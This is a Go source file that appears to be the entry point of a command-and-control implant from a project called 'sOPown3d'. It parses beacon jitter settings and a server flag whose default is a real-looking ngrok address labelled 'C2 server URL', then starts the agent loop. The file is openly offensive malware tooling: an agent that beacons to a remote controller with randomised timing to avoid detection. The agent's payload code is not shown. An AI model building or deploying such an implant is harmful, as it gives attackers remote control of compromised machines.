package main

import (
	"context"
	"flag"
	"log"
	"os/signal"
	"syscall"

	"sOPown3d/internal/agent"
	"sOPown3d/pkg/shared"
)

func main() {
	cfg := parseConfig()

	a, err := agent.New(cfg)
	if err != nil {
		log.Fatalf("failed to create agent: %v", err)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer cancel()

	if err := a.Run(ctx); err != nil {
		log.Fatalf("agent stopped: %v", err)
	}
}

func parseConfig() agent.Config {
	jitterMin := flag.Float64("jitter-min", 1.0, "min jitter (s)")
	jitterMax := flag.Float64("jitter-max", 2.0, "max jitter (s)")
	serverURL := flag.String("server", "https://thoughtless-louvenia-superbelievably.ngrok-free.dev", "C2 server URL")
	flag.Parse()

	if *jitterMin <= 0 || *jitterMax <= *jitterMin {
		log.Fatalf("invalid jitter range: min=%.2f max=%.2f", *jitterMin, *jitterMax)
	}

	return agent.Config{
		ServerURL: *serverURL,
		Jitter: shared.JitterConfig{
			MinSeconds: *jitterMin,
			MaxSeconds: *jitterMax,
		},
	}
}
